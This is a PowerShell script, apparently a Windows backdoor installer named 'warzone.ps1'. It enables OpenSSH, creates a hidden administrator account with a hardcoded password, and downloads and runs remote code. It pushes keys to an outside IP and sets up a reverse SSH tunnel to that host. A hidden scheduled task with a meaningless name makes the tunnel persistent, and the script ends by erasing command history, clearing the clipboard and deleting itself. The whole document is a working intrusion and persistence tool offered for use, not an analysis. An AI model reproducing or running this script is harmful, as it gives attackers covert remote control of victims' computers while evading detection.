Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType Automatic
New-NetFirewallRule -Name sshd -DisplayName "OpenSSH Server (sshd)" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 -ErrorAction SilentlyContinue


net user psyu Clark2025! /add
net localgroup administradores psyu /add
net localgroup administrators psyu /add
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" -Force
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "psyu" -Value 0 -PropertyType DWord -Force

$configDir  = "C:\ProgramData\ssh"
$configPath = "$configDir\sshd_config"

try {
    if (!(Test-Path $configDir)) {
        Write-Host "==> Creando carpeta: $configDir"
        New-Item -ItemType Directory -Path $configDir -Force | Out-Null
    }
}
catch {
    Write-Error "  -> Error creando carpeta ${configDir}: $_"
}

try {
    if (!(Test-Path $configPath)) {
        Write-Host "==> Creando nuevo archivo de configuración: $configPath"
        @"
Port 22
AddressFamily any
ListenAddress 0.0.0.0
PermitRootLogin no
PasswordAuthentication yes
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys
Subsystem sftp sftp-server.exe
UseDNS no
PrintMotd no
"@ | Out-File -FilePath $configPath -Encoding utf8 -Force
    }
    else {
        Write-Host "==> El archivo ya existe. Se mantiene la configuración actual."
    }
}
catch {
    Write-Error "==> No se pudo crear ${configPath}: $_"
}

try {
    $backupPath = "${configPath}.bak"
    Copy-Item -Path $configPath -Destination $backupPath -Force
    Write-Host "==> Backup creado: $backupPath"
}
catch {
    Write-Warning "==> No se pudo crear backup de ${configPath}: $_"
}


$ConfigPath = "C:\ProgramData\ssh\sshd_config"

(Get-Content $ConfigPath) `
    -replace '#?PasswordAuthentication\s+no', 'PasswordAuthentication yes' `
    -replace '#?PasswordAuthentication\s+yes', 'PasswordAuthentication yes' `
    | Set-Content $ConfigPath

Restart-Service sshd

Invoke-WebRequest https://community.chocolatey.org/install.ps1 -UseBasicParsing | Invoke-Expression

Set-ExecutionPolicy Bypass -Scope Process -Force

choco install putty -y --no-progress --ignore-checksums

$configPath = "$env:USERPROFILE\.ssh\config"

if (-not (Test-Path "$env:USERPROFILE\.ssh")) {
    New-Item -ItemType Directory -Path "$env:USERPROFILE\.ssh" | Out-Null
}

$configContent = @"
Host linda-flor
    HostName 200.234.238.241
    User user
    Port 22
"@

Set-Content -Path $configPath -Value $configContent -Encoding UTF8

ssh-keygen -t rsa -b 4096 -f $env:USERPROFILE\.ssh\id_rsa -N ""
  
plink.exe -ssh  user@200.234.238.241 -pw "password"
 
$pubKey = Get-Content "$env:USERPROFILE\.ssh\id_rsa.pub"

plink.exe user@200.234.238.241 -pw "password" "mkdir -p ~/.ssh && echo '$pubKey' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"

"ssh -R 0.0.0.0:2222:localhost:22 linda-flor -N" | Add-Content "C:\autossh.ps1"


$archivo = "C:\autossh.ps1"

$dirs = Get-ChildItem -Path C:\ -Directory -Recurse -ErrorAction SilentlyContinue

$randomDir = Get-Random -InputObject $dirs

Move-Item -Path $archivo -Destination "$($randomDir.FullName)\autossh.ps1"

attrib +h +s "$($randomDir.FullName)\autossh.ps1"

$scriptPath = (Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -eq "autossh.ps1" } |
    Select-Object -ExpandProperty FullName)

$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""

$Trigger = New-ScheduledTaskTrigger -AtLogOn

$Principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest

Register-ScheduledTask -TaskName " . " -Action $Action -Trigger $Trigger -Principal $Principal -Description " . "

Clear-History
Try { Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue } Catch {}

Remove-Variable -Name pw,password -ErrorAction SilentlyContinue
[System.GC]::Collect(); [System.GC]::WaitForPendingFinalizers()

Try { Set-Clipboard -Value '' } Catch {}

$exeName = "warzone.ps1"

$exePath = Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -eq $exeName } |
    Select-Object -First 1 -ExpandProperty FullName

if ($exePath) {
    Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
} else {
    Write-Host " . "
}


